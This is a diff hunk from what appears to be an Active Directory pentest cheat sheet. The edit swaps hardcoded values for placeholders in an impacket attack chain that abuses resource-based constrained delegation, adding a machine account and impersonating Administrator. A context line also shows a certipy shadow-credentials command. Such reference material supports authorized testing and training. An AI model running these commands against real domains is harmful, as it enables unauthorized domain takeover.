@@ -307,9 +307,9 @@ certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target> -dc-ip
 
 # RBCD — GenericWrite on a computer -> delegate from a machine acct -> impersonate anyone to it:
 # companion:gen rbcd-impacket
-impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <ip_address> <domain>/<user>:<password>
-impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target>$' -action write -dc-ip <ip_address> <domain>/<user>:<password>
-impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address> <domain>/'EVIL$':'Passw0rd!'
+impacket-addcomputer -computer-name '<machine_account>$' -computer-pass '<machine_password>' -dc-ip <ip_address> <domain>/<user>:<password>
+impacket-rbcd -delegate-from '<machine_account>$' -delegate-to '<target>$' -action write -dc-ip <ip_address> <domain>/<user>:<password>
+impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address> <domain>/'<machine_account>$':'<machine_password>'
 # companion:end rbcd-impacket
 ////////////////////////////////////////
 
